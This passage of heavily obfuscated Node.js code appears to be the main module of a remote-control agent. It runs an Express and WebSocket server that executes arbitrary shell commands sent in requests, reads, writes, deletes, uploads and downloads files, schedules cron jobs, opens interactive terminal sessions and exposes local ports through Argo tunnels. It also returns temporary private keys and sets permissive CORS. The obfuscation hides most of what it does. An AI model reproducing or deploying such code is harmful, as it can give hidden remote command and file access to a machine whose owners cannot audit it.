                } catch (k) {
                    f = ![];
                }
            !f && this[fU(0x583)][fU(0x462)](d[fU(0x562)](fU(0x5ef)));
        } catch (l) {
            a0D[fU(0x604)]('[终端会话\x20' + this[fU(0x2c3)] + ']\x20⚠️\x20指令处理异常:\x20' + l[fU(0x56d)]);
            if (this[fU(0x4ba)])
                this[fU(0x815)]();
        }
    }
}
async function a0aU(a = {}) {
    const fV = a0aX, b = {
            'fEqKt': fV(0x503),
            'zOmOr': fV(0x4a8),
            'uqoUk': fV(0x6ea),
            'MNuEO': 'x-encrypted',
            'QPtyL': 'Access-Control-Expose-Headers',
            'gayGv': fV(0x44f),
            'lEcNj': fV(0x14d),
            'IACrc': fV(0x3a8),
            'wiSVI': fV(0x545),
            'JdFbG': function (c, d) {
                return c / d;
            },
            'IzBUM': function (c, d) {
                return c / d;
            },
            'PjAce': function (c, d) {
                return c > d;
            },
            'VKCjs': function (c, d) {
                return c - d;
            },
            'fMTYg': fV(0x320),
            'XjTVH': function (c, d) {
                return c === d;
            },
            'WfCoE': fV(0x2ca),
            'QGWtX': function (c, d) {
                return c < d;
            },
            'NmoEb': function (c, d) {
                return c > d;
            },
            'bpoRf': function (c, d) {
                return c(d);
            },
            'MPXSK': function (c, d) {
                return c(d);
            },
            'yOXLK': fV(0x5fd),
            'hKWEk': function (c, d) {
                return c > d;
            },
            'QaDjm': function (c, d) {
                return c - d;
            },
            'uXJNN': fV(0x628),
            'VQJgH': function (c, d) {
                return c === d;
            },
            'ZkWeP': fV(0x419),
            'GIoqG': 'cmd\x20required',
            'KoShQ': function (c, d) {
                return c(d);
            },
            'zmyWR': fV(0x789),
            'ZRixc': fV(0x4c9),
            'VPFDa': fV(0x6b1),
            'VcpOt': fV(0x119),
            'vYjCP': function (c, d) {
                return c !== d;
            },
            'akDAD': function (c, d, f) {
                return c(d, f);
            },
            'JCrdC': function (c, d) {
                return c(d);
            },
            'bOAPy': function (c, d) {
                return c !== d;
            },
            'ijfxY': function (c, d, f) {
                return c(d, f);
            },
            'vShqQ': function (c, d) {
                return c(d);
            },
            'FVOvZ': 'Invalid\x20binary\x20stream\x20request\x20body',
            'YGEdz': fV(0x4b1),
            'TfPyy': 'x-original-path',
            'Rtrrk': fV(0x474),
            'yCXCL': fV(0x131),
            'blqrS': fV(0x7d4),
            'hCuAM': function (c, d) {
                return c !== d;
            },
            'pOQMM': function (c, d) {
                return c === d;
            },
            'wtyrd': function (c, d) {
                return c === d;
            },
            'rJwsR': function (c, d) {
                return c(d);
            },
            'zMJlr': function (c, d) {
                return c > d;
            },
            'OfjPn': fV(0x517),
            'OsIoX': function (c, d) {
                return c(d);
            },
            'jiqcK': function (c, d) {
                return c === d;
            },
            'UcOrl': function (c, d) {
                return c === d;
            },
            'tSSyt': function (c, d) {
                return c < d;
            },
            'oYLZx': function (c, d) {
                return c > d;
            },
            'zhiFu': function (c, d) {
                return c ?? d;
            },
            'MkWKe': 'port\x20is\x20required\x20and\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'yLYVh': function (c, d) {
                return c === d;
            },
            'lUSVz': fV(0x17a),
            'UFPuq': fV(0x449),
            'ndMQs': 'utf-8',
            'SbZOH': fV(0x62f),
            'Bjxru': 'Server\x20listening\x20successfully',
            'qzWcQ': function (c, d) {
                return c === d;
            },
            'CZNHB': fV(0x366),
            'KGLZW': fV(0x1ea),
            'SrSIx': '@noble/curves/secp256k1.js',
            'tuYWh': fV(0x293),
            'hqbXI': 'Validating\x20config...',
            'WOYcz': fV(0x76e),
            'meqsR': fV(0x5ad),
            'Qraao': fV(0x298),
            'uxxeg': fV(0x27e),
            'UYQln': fV(0x682),
            'MtRUg': 'Express\x20app\x20created\x20and\x20expressWs\x20applied',
            'hDUEN': '50mb',
            'jIwIE': fV(0x65a),
            'xkASx': '/api/run',
            'XpGXU': fV(0x492),
            'sWCjP': fV(0x67e),
            'gPsZR': fV(0x698),
            'EXDtU': fV(0x6c6),
            'ofhbr': fV(0x706),
            'uMmNG': fV(0x429),
            'IFLKx': fV(0x51b),
            'ELFUB': '/api/file/new',
            'Liepc': fV(0x6ae),
            'hTgxH': fV(0x169),
            'YFENE': fV(0x2fe),
            'NUfVn': fV(0x5b8),
            'DuVvw': fV(0x66a),
            'Odrop': fV(0x750),
            'prFOZ': fV(0x1dd),
            'qSeRr': fV(0x6f8),
            'sbrTa': fV(0x6d2),
            'BzELQ': fV(0x491),
            'HgKtH': 'Starting\x20HTTP\x20server...',
            'vemwQ': fV(0x621),
            'UMDQX': fV(0x558)
        };
    try {
        const c = await import(b[fV(0x7b0)]);
        a0A = c[fV(0x58f)];
        const d = await import(b[fV(0x632)]);
        a0B = d['secp256k1'], a0D[fV(0x4b3)](b[fV(0x2fd)]), a0P['merge'](a), a0D['debug'](b[fV(0x6cb)]), a0P[fV(0x5a4)](), a0D[fV(0x4b3)](b['WOYcz']), a0D[fV(0x4b3)](b[fV(0x88d)]);
        const f = new a0R(a0P[fV(0x848)], a0P[fV(0x361)]);
        a0D['debug'](fV(0x182));
        !a0P[fV(0x4eb)] && !f['ecdsaPubkey'] && (a0D[fV(0x2ca)](fV(0x116)), a0D['error'](fV(0x4f3)), process[fV(0x33f)](0x1));
        a0D[fV(0x4b3)](fV(0x1ed));
        const g = new a0Q();
        g['onExpired'] = () => a0P[fV(0x6e8)](), a0D[fV(0x4b3)](fV(0x15c)), a0D[fV(0x4b3)](b[fV(0x66f)]);
        const h = new a0U();
        a0D[fV(0x4b3)](b[fV(0x4fc)]), a0D[fV(0x4b3)](b[fV(0x708)]);
        const i = a0f();
        a0x(i), a0D[fV(0x4b3)](b['MtRUg']), i[fV(0x7bf)]((n, o, p) => {
            const fW = fV, q = b[fW(0x317)][fW(0x622)]('|');
            let r = 0x0;
            while (!![]) {
                switch (q[r++]) {
                case '0':
                    o[fW(0x1f2)](b[fW(0x75b)], '*');
                    continue;
                case '1':
                    p();
                    continue;
                case '2':
                    if (n[fW(0x18c)] === b['uqoUk'])
                        return a0P[fW(0x4eb)] && o['set'](b[fW(0x1ad)], 'false'), o[fW(0x126)](0xc8)[fW(0x712)]();
                    continue;
                case '3':
                    o['header'](b['QPtyL'], fW(0x54c));
                    continue;
                case '4':
                    o[fW(0x1f2)](fW(0x1ba), b[fW(0x732)]);
                    continue;
                case '5':
                    o[fW(0x1f2)](b['lEcNj'], b['IACrc']);
                    continue;
                }
                break;
            }
        }), i[fV(0x7bf)](a0f[fV(0x7f4)]({
            'type': n => n[fV(0x785)] !== fV(0x706),
            'limit': b['hDUEN']
        })), i['use'](a0f['urlencoded']({ 'extended': !![] })), i[fV(0x7bf)](b[fV(0x28f)](a0T, f, g)), a0D[fV(0x4b3)](b[fV(0x49e)]), i[fV(0x858)](fV(0x651), async (n, o) => {
            const fX = fV;
            try {
                const p = Math[fX(0x3a3)](b[fX(0x1ca)](Date['now'](), 0x3e8));
                !a0P['_baseinfo_cache'] || b[fX(0x2bf)](b[fX(0x5b4)](p, a0P[fX(0x3e2)]), a0P['BASEINFO_CACHE_TTL']) ? (!a0P[fX(0x485)] && (a0P['_baseinfo_fetch_promise'] = h[fX(0x43f)]()['then'](r => {
                    const fY = fX, s = b[fY(0x4bb)]['split']('|');
                    let t = 0x0;
                    while (!![]) {
                        switch (s[t++]) {
                        case '0':
                            a0P[fY(0x3e2)] = Math[fY(0x3a3)](b['JdFbG'](Date['now'](), 0x3e8));
                            continue;
                        case '1':
                            a0P[fY(0x485)] = null;
                            continue;
                        case '2':
                            a0D[fY(0x4b3)](fY(0x4bf));
                            continue;
                        case '3':
                            a0P['_baseinfo_cache'] = r;
                            continue;
                        case '4':
                            return r;
                        }
                        break;
                    }
                })['catch'](r => {
                    const fZ = fX;
                    a0P[fZ(0x485)] = null;
                    throw r;
                })), await a0P[fX(0x485)]) : a0D['debug'](b['fMTYg']);
                const q = { ...a0P[fX(0x71f)] };
                b[fX(0x3a9)](n[fX(0x412)], !![]) ? (q[fX(0x5f1)] = a0P['SESSION_KEY'], q[fX(0x2a8)] = a0P['NOISE_KEY']) : (q[fX(0x5f1)] = null, q[fX(0x2a8)] = null), o['json'](q), a0P[fX(0x77d)] === '1' && a0aN['onBaseinfoSuccess']();
            } catch (r) {
                o[fX(0x126)](0x1f4)[fX(0x738)]({
                    'status': b[fX(0x641)],
                    'message': r[fX(0x56d)]
                });
            }
        }), i['get'](fV(0x6fc), (n, o) => {
            const g0 = fV;
            let p = a0P['TEMPKEY_DEFAULT_TTL_HOURS'];
            if (n[g0(0x4a3)][g0(0x801)] !== undefined) {
                const s = parseInt(n[g0(0x4a3)]['ttl'], 0xa);
                if (Number[g0(0x7a7)](s) || b[g0(0x5c2)](s, 0x1) || b[g0(0x869)](s, a0P['TEMPKEY_MAX_TTL_HOURS']))
                    return o['status'](0x1a6)[g0(0x738)]({ 'error': g0(0x288) + a0P[g0(0x329)] });
                p = s;
            }
            const q = g[g0(0x2b3)](p), r = u => new Date(u * 0x3e8)[g0(0x444)]()[g0(0x884)]('.000Z', 'Z');
            o[g0(0x738)]({
                'status': 'ok',
                'key_id': q[g0(0x47c)],
                'ttl_seconds': q[g0(0x886)],
                'created_at': b[g0(0x8aa)](r, q['created_at']),
                'expires_at': b[g0(0x3cb)](r, q[g0(0x306)]),
                'ecdsa': {
                    'private_key': q[g0(0x4f5)][g0(0x1c8)](),
                    'public_key': q[g0(0x7b7)][g0(0x1c8)]()
                },
                'ecies': {
                    'private_key': q['ecies_private_key'],
                    'public_key': q[g0(0x890)]
                }
            });
        }), i[fV(0x858)](fV(0x470), async (n, o) => {
            const g2 = fV, p = {
                    'YeCuq': function (q, r) {
                        const g1 = a0b;
                        return b[g1(0x1ca)](q, r);
                    },
                    'xdBsl': b[g2(0x340)]
                };
            try {
                const q = Math['floor'](b[g2(0x5e8)](Date[g2(0x1d8)](), 0x3e8));
                !a0P['_status_cache'] || b['hKWEk'](b[g2(0x6c0)](q, a0P[g2(0x688)]), a0P[g2(0x433)]) ? (!a0P[g2(0x84e)] && (a0P[g2(0x84e)] = h['getRealtimeInfo']()[g2(0x172)](s => {
                    const g3 = g2;
                    return a0P['_status_cache'] = s, a0P['_status_cache_time'] = Math[g3(0x3a3)](p[g3(0x475)](Date[g3(0x1d8)](), 0x3e8)), a0P[g3(0x84e)] = null, a0D[g3(0x4b3)](p['xdBsl']), s;
                })[g2(0x237)](s => {
                    a0P['_status_fetch_promise'] = null;
                    throw s;
                })), await a0P['_status_fetch_promise']) : a0D['debug']('📦\x20[Cache]\x20Status\x20命中监控缓存。');
                const r = { ...a0P[g2(0x4e5)] };
                o[g2(0x738)](r);
            } catch (s) {
                o['status'](0x1f4)[g2(0x738)]({
                    'status': b[g2(0x641)],
                    'message': s['message']
                });
            }
        });
        const j = async (n, o) => {
            const g4 = fV;
            try {
                let p = null;
                if (b[g4(0x3a9)](typeof n[g4(0x737)], b[g4(0x341)]))
                    p = n[g4(0x737)][g4(0x1c8)]();
                else
                    n[g4(0x737)] && b[g4(0x38a)](typeof n[g4(0x737)], b[g4(0x6fa)]) && (p = n['body']['cmd'] || '');
                if (!p)
                    return o[g4(0x126)](0x190)[g4(0x738)]({
                        'status': b[g4(0x641)],
                        'message': b[g4(0x11c)]
                    });
                const q = await a0V[g4(0x52e)](p, {
                    'cwd': n[g4(0x737)][g4(0x60e)],
                    'env': n['body']['env'],
                    'timeout': a0P[g4(0x220)]
                });
                o[g4(0x738)](q);
            } catch (r) {
                o[g4(0x126)](0x1f4)[g4(0x738)]({
                    'status': b[g4(0x641)],
                    'message': r[g4(0x56d)]
                });
            }
        };
        i[fV(0x11a)](fV(0x163), j);
        for (const n of [
                fV(0x410),
                b[fV(0x88f)],
                '/api/work'
            ]) {
            i[fV(0x11a)](n, j);
        }
        i[fV(0x11a)](b[fV(0x42d)], async (o, p) => {
            const g5 = fV;
            try {
                const q = await a0Y[g5(0x4d8)](o[g5(0x737)][g5(0x785)], o[g5(0x737)]['recursive']);
                p['json']({
                    'status': 'ok',
                    'count': q[g5(0x38d)],
                    'files': q
                });
            } catch (r) {
                p['status'](0x1f4)['json']({
                    'status': b[g5(0x641)],
                    'message': r['message']
                });
            }
        }), i[fV(0x11a)](b[fV(0x423)], async (o, p) => {
            const g6 = fV;
            try {
                const q = await a0Y[g6(0x425)](o[g6(0x737)]['paths'] || []);
                p[g6(0x738)]({
                    'status': 'ok',
                    'files': q
                });
            } catch (r) {
                p[g6(0x126)](0x1f4)[g6(0x738)]({
                    'status': g6(0x2ca),
                    'message': r[g6(0x56d)]
                });
            }
        }), i['put'](b[fV(0x423)], async (o, p) => {
            const g7 = fV;
            try {
                const q = o[g7(0x737)][g7(0x855)] || {}, r = o[g7(0x737)][g7(0x33b)] === !![], s = await a0Y[g7(0x307)](q, r);
                p[g7(0x738)](s);
            } catch (t) {
                p[g7(0x126)](0x1f4)[g7(0x738)]({
                    'status': g7(0x2ca),
                    'message': t['message']
                });
            }
        }), i['post'](b['gPsZR'], async (o, p) => {
            const g8 = fV;
            try {
                const q = await a0Y[g8(0x3d3)](o[g8(0x737)][g8(0x785)]);
                p[g8(0x738)](q);
            } catch (r) {
                p['status'](0x1f4)[g8(0x738)]({
                    'status': b[g8(0x641)],
                    'message': r[g8(0x56d)]
                });
            }
        }), i[fV(0x11a)](b['EXDtU'], async (o, p) => {
            const g9 = fV;
            try {
                const q = await a0Y[g9(0x45e)](o[g9(0x737)][g9(0x785)], o[g9(0x737)][g9(0x743)], o['body'][g9(0x721)], o['body']['chunk_id'], o[g9(0x737)]['total_chunks']);
                p[g9(0x738)](q);
            } catch (r) {
                p[g9(0x126)](0x1f4)[g9(0x738)]({
                    'status': b['WfCoE'],
                    'message': r['message']
                });
            }
        }), i[fV(0x11a)](b[fV(0x3d9)], a0f['raw']({
            'type': b[fV(0x85b)],
            'limit': fV(0x4e7)
        }), async (o, p) => {
            const ga = fV;
            try {
                const q = b[ga(0x3cb)](decodeURIComponent, o[ga(0x27c)][ga(0x2ed)] || ''), r = b[ga(0x72d)](decodeURIComponent, o[ga(0x27c)][b[ga(0x803)]] || ''), s = o['headers'][b['ZRixc']], t = o[ga(0x27c)][b['VPFDa']];
                if (!q || !r)
                    return p[ga(0x126)](0x190)['json']({
                        'status': b[ga(0x641)],
                        'completed': ![],
                        'message': b['VcpOt']
                    });
                const u = b[ga(0x4d6)](s, undefined) ? b['akDAD'](parseInt, b['JCrdC'](String, s), 0xa) : null, v = b[ga(0x4a2)](t, undefined) ? b['ijfxY'](parseInt, b[ga(0x39d)](String, t), 0xa) : null, w = o[ga(0x737)];
                if (!Buffer[ga(0x87c)](w))
                    return p[ga(0x126)](0x190)[ga(0x738)]({
                        'status': b[ga(0x641)],
                        'completed': ![],
                        'message': b['FVOvZ']
                    });
                const x = await a0Y[ga(0x2ad)](q, r, w, u, v);
                p[ga(0x738)](x);
            } catch (y) {
                p[ga(0x126)](0x1f4)['json']({
                    'status': b[ga(0x641)],
                    'completed': ![],
                    'message': y[ga(0x56d)]
                });
            }
        }), i['post'](fV(0x5f3), async (o, p) => {
            const gb = fV;
            try {
                const q = await a0Y[gb(0x4fa)](o[gb(0x737)]['path']);
                return p[gb(0x51f)](b[gb(0x5fa)], q[gb(0x221)][gb(0x562)]()), p[gb(0x51f)](b[gb(0x5d5)], q[gb(0x785)]), p[gb(0x51f)](b[gb(0x6b2)], gb(0x429)), p[gb(0x580)](q[gb(0x721)]);
            } catch (r) {
                p[gb(0x126)](0x1f4)[gb(0x738)]({
                    'status': b['WfCoE'],
                    'message': r[gb(0x56d)]
                });
            }
        }), i['delete'](b[fV(0x4ef)], async (o, p) => {
            const gc = fV;
            try {
                let q = o[gc(0x737)][gc(0x141)];
                if (!q || !Array[gc(0x7cd)](q)) {
                    q = [];
                    if (o[gc(0x737)]['path'])
                        q[gc(0x4a7)](o['body'][gc(0x785)]);
                    if (o['body']['path2'])
                        q[gc(0x4a7)](o[gc(0x737)][gc(0x31c)]);
                }
                const r = await a0Y[gc(0x424)](q);
                p['json']({
                    'status': 'ok',
                    'results': r
                });
            } catch (s) {
                p[gc(0x126)](0x1f4)[gc(0x738)]({
                    'status': b[gc(0x641)],
                    'message': s['message']
                });
            }
        }), i['put'](b['EXDtU'], async (o, p) => {
            const gd = fV;
            try {
                const q = await a0Y[gd(0x6e9)](o[gd(0x737)]['move_map'] || o[gd(0x737)]);
                p['json']({
                    'status': 'ok',
                    'total': q[gd(0x38d)],
                    'success': q['filter'](s => s[gd(0x126)] === 'ok')[gd(0x38d)],
                    'results': q
                });
            } catch (r) {
                p['status'](0x1f4)['json']({
                    'status': b[gd(0x641)],
                    'message': r[gd(0x56d)]
                });
            }
        }), i[fV(0x11a)](b[fV(0x74d)], async (o, p) => {
            const ge = fV;
            try {
                const q = await a0Y[ge(0x35e)](o[ge(0x737)]);
                p[ge(0x738)]({
                    'status': 'ok',
                    'total': q[ge(0x38d)],
                    'success': q[ge(0x597)](s => s[ge(0x126)] === 'ok')[ge(0x38d)],
                    'results': q
                });
            } catch (r) {
                p[ge(0x126)](0x1f4)[ge(0x738)]({
                    'status': ge(0x2ca),
                    'message': r['message']
                });
            }
        }), i['post'](b[fV(0x392)], async (o, p) => {
            const gf = fV;
            try {
                const q = await a0Y[gf(0x1fe)](o[gf(0x737)][gf(0x785)]);
                p[gf(0x738)](q);
            } catch (r) {
                p[gf(0x126)](0x1f4)['json']({
                    'status': b[gf(0x641)],
                    'message': r[gf(0x56d)]
                });
            }
        }), i[fV(0x11a)](b[fV(0x1a8)], async (o, p) => {
            const gg = fV;
            try {
                const q = o[gg(0x737)] || {};
                if (!q[gg(0x785)])
                    return p['status'](0x190)[gg(0x738)]({ 'error': b[gg(0x673)] });
                if (!Array[gg(0x7cd)](q[gg(0x740)]) || b[gg(0x3a9)](q[gg(0x740)][gg(0x38d)], 0x0))
                    return p[gg(0x126)](0x190)[gg(0x738)]({ 'error': b['blqrS'] });
                const r = await a0Y[gg(0x505)](q[gg(0x785)], q['items'], !!q[gg(0x140)]);
                p[gg(0x738)](r);
            } catch (s) {
                const t = /Access denied/['test'](s[gg(0x56d)]) ? 0x193 : 0x190;
                p[gg(0x126)](t)[gg(0x738)]({
                    'status': b[gg(0x641)],
                    'message': s[gg(0x56d)]
                });
            }
        }), i[fV(0x11a)](fV(0x6cc), async (o, p) => {
            const gh = fV;
            try {
                const q = o[gh(0x737)] || {};
                if (!q['path'])
                    return p[gh(0x126)](0x190)[gh(0x738)]({ 'error': b[gh(0x673)] });
                const r = await a0Y['unzipArchive'](q['path'], q[gh(0x406)], b[gh(0x2de)](q[gh(0x265)], ![]), Array[gh(0x7cd)](q[gh(0x3f7)]) ? q[gh(0x3f7)] : null);
                p[gh(0x738)](r);
            } catch (s) {
                const t = /Access denied/[gh(0x328)](s['message']) ? 0x193 : 0x190;
                p[gh(0x126)](t)['json']({
                    'status': b[gh(0x641)],
                    'message': s['message']
                });
            }
        }), i[fV(0x858)](fV(0x637), (o, p) => {
            const gi = fV;
            p[gi(0x738)](a0a0[gi(0x56b)]());
        }), i['post'](fV(0x637), async (o, p) => {
            const gj = fV;
            try {
                const q = await a0a0[gj(0x188)](o[gj(0x737)]);
                p[gj(0x738)](q);
            } catch (r) {
                p[gj(0x126)](0x1f4)[gj(0x738)]({
                    'status': b[gj(0x641)],
                    'message': r[gj(0x56d)]
                });
            }
        }), i[fV(0x858)](b[fV(0x5ed)], (o, p) => {
            const gk = fV;
            p[gk(0x738)](a0a0[gk(0x5df)]());
        }), i[fV(0x11a)](b[fV(0x5ed)], (o, p) => {
            const gl = fV;
            try {
                const q = a0a0['setCronTasks'](o[gl(0x737)]);
                p[gl(0x738)](q);
            } catch (r) {
                p[gl(0x126)](0x1f4)[gl(0x738)]({
                    'status': b['WfCoE'],
                    'message': r['message']
                });
            }
        }), i[fV(0x858)](b[fV(0x5d7)], (o, p) => {
            const gm = fV;
            p[gm(0x738)](a0a0[gm(0x807)]());
        }), i[fV(0x858)](b['NUfVn'], (o, p) => {
            const gn = fV;
            let q = parseInt(o[gn(0x4a3)][gn(0x454)], 0xa) || 0x32;
            q = Math[gn(0x71e)](Math['max'](q, 0x1), 0x64), p[gn(0x738)](a0a0[gn(0x260)](q));
        }), i['get'](b[fV(0x6a7)], (o, p) => {
            const go = fV;
            let q = b[go(0x30e)](parseInt, o[go(0x4a3)][go(0x454)], 0xa) || 0x32;
            q = Math[go(0x71e)](Math[go(0x12c)](q, 0x1), 0x64), p[go(0x738)](a0a0[go(0x67c)](q));
        }), i[fV(0x3f6)](b['NUfVn'], (o, p) => {
            const gp = fV;
            p['json'](a0a0[gp(0x143)]());
        }), i[fV(0x3f6)]('/api/task/log/cron', (o, p) => {
            const gq = fV;
            p[gq(0x738)](a0a0['clearCronLogs']());
        }), i[fV(0x858)](b[fV(0x765)], (o, p) => {
            const gr = fV;
            p[gr(0x738)](a0a0['getLogSummary']());
        }), i[fV(0x11a)](b[fV(0x725)], async (o, p) => {
            const gs = fV;
            try {
                const q = await a0a0[gs(0x55e)]();
                p[gs(0x738)](q);
            } catch (r) {
                p[gs(0x126)](0x1f4)[gs(0x738)]({
                    'status': gs(0x2ca),
                    'message': r[gs(0x56d)]
                });
            }
        });
        const k = {
                'debug': (...o) => a0D[fV(0x4b3)](o[fV(0x344)]('\x20')),
                'info': (...o) => a0D[fV(0x604)](o[fV(0x344)]('\x20')),
                'warning': (...o) => a0D[fV(0x133)](o[fV(0x344)]('\x20'))
            }, l = new a0aM(k);
        i[fV(0x858)]('/api/argo', (o, p) => {
            const gt = fV, q = l['list']();
            p['json']({
                'status': 'ok',
                'count': q[gt(0x38d)],
                'tunnels': q
            });
        }), i[fV(0x11a)](b['qSeRr'], async (o, p) => {
            const gu = fV;
            try {
                const q = b[gu(0x8aa)](a0aL, o[gu(0x737)]);
                let r = q[gu(0x458)];
                (b[gu(0x1b9)](r, undefined) || b[gu(0x8a3)](r, null) || r === '') && (r = a0P[gu(0x821)]);
                const s = b['rJwsR'](Number, r);
                if (!Number[gu(0x6ed)](s) || b['QGWtX'](s, 0x1) || b[gu(0x39f)](s, 0xffff))
                    return p[gu(0x126)](0x1a6)['json']({
                        'status': b[gu(0x641)],
                        'created': ![],
                        'port': r,
                        'message': b[gu(0x851)]
                    });
                const t = await l['create'](s, b['wtyrd'](q[gu(0x31d)], !![]));
                p[gu(0x738)]({
                    'status': 'ok',
                    'created': !![],
                    'tunnel_domain': t[gu(0x4ae)],
                    'port': t[gu(0x458)],
                    'created_at': t[gu(0x39a)]
                });
            } catch (u) {
                p[gu(0x126)](u[gu(0x126)] || 0x1f4)[gu(0x738)]({
                    'status': b[gu(0x641)],
                    'created': ![],
                    'port': u[gu(0x458)] ?? null,
                    'message': u[gu(0x56d)]
                });
            }
        }), i[fV(0x3f6)]('/api/argo', async (o, p) => {
            const gv = fV;
            try {
                const q = b[gv(0x6d3)](a0aL, o[gv(0x737)]), r = q[gv(0x458)], s = b[gv(0x6bc)](Number, r);
                if (b[gv(0x156)](r, undefined) || r === null || b[gv(0x744)](r, '') || !Number['isInteger'](s) || b[gv(0x37e)](s, 0x1) || b[gv(0x37f)](s, 0xffff))
                    return p[gv(0x126)](0x1a6)['json']({
                        'status': b[gv(0x641)],
                        'deleted': 0x0,
                        'port': b[gv(0x620)](r, null),
                        'message': b[gv(0x69e)]
                    });
                const t = await l[gv(0x23c)](s, q[gv(0x556)]);
                if (t[gv(0x126)] === 'ok')
                    return p[gv(0x738)]({
                        'status': 'ok',
                        'deleted': t['deleted'],
                        'port': s,
                        'tunnels': t['tunnels']
                    });
                return p[gv(0x126)](t['status'])[gv(0x738)]({
                    'status': b[gv(0x641)],
                    'deleted': 0x0,
                    'port': s,
                    'message': t[gv(0x56d)]
                });
            } catch (u) {
                p[gv(0x126)](0x1f4)['json']({
                    'status': b[gv(0x641)],
                    'deleted': 0x0,
                    'message': u[gv(0x56d)]
                });
            }
        }), a0D[fV(0x4b3)](fV(0x62c)), i['ws'](b[fV(0x643)], async (o, p) => {
            const gw = fV, q = p[gw(0x6ec)][0x0];
            a0D['debug']('WebSocket\x20request\x20URL:\x20' + p[gw(0x14e)]), a0D[gw(0x4b3)](gw(0x2a5) + q);
            const r = p[gw(0x4a3)][gw(0x1f7)], s = p[gw(0x4a3)][gw(0x547)], t = p[gw(0x4a3)][gw(0x64e)] === '1', u = b[gw(0x5a0)](p[gw(0x4a3)][gw(0x296)], '1');
            a0D['debug'](gw(0x284) + r);
            if (!r) {
                a0D['debug'](b[gw(0x24c)]), o[gw(0x5a2)](0x3f0, b['UFPuq']);
                return;
            }
            if (s) {
                const w = a0P[gw(0x5a8)](), x = Buffer[gw(0x3a5)](b[gw(0x39d)](String, s), b[gw(0x7cc)]), y = Buffer[gw(0x3a5)](w, b[gw(0x7cc)]), z = b['XjTVH'](x[gw(0x38d)], y['length']) && a0k[gw(0x587)](x, y);
                if (!z) {
                    a0D[gw(0x133)](gw(0x7e8) + r + gw(0x152)), o[gw(0x5a2)](0x3f0, b['SbZOH']);
                    return;
                }
            }
            const v = new a0aT();
            await v['startSession'](o, r, s, t, u);
        }), a0D[fV(0x4b3)](b[fV(0x3ba)]), a0a0[fV(0x456)](), a0D[fV(0x4b3)](b['HgKtH']);
        const m = i[fV(0x404)](a0P['PORT'], a0P[fV(0x158)], () => {
            const gx = fV;
            a0D['debug'](gx(0x235) + a0P[gx(0x811)] + gx(0x17c) + a0P[gx(0x158)] + ':' + a0P['PORT']), a0D['debug'](b[gx(0x67f)]), (b['VQJgH'](a0P[gx(0x77d)], '1') || b[gx(0x1c4)](a0P[gx(0x77d)], '2') && a0aN[gx(0x825)]()) && a0aN[gx(0x47f)](l);
        });
        process['on'](b[fV(0x19e)], () => {
            const gy = fV;
            a0D[gy(0x4b3)](b[gy(0x520)]), m[gy(0x5a2)](), process[gy(0x33f)](0x0);
        }), a0D[fV(0x4b3)](b[fV(0x603)]);
    } catch (o) {
        a0D['error'](fV(0x57c), o), process[fV(0x33f)](0x1);
    }
}
(require[a0aX(0x577)] === module || require[a0aX(0x577)]?.[a0aX(0x743)]?.[a0aX(0x1be)](a0aX(0x6cf))) && a0aU()[a0aX(0x237)](a0D[a0aX(0x2ca)]);
module['exports'] = {
    'main': a0aU,
    'Config': a0P,
    'CryptoManager': a0R,
    'SystemInfoCollector': a0U,
    'CommandExecutor': a0V,
    'FileManager': a0Y,
    'TaskManager': a0a0,
    'TaskStore': a0Z,
    'ArgoTunnelManager': a0aM,
    'KModeController': a0aN,
    'ZipArchiver': a0X
};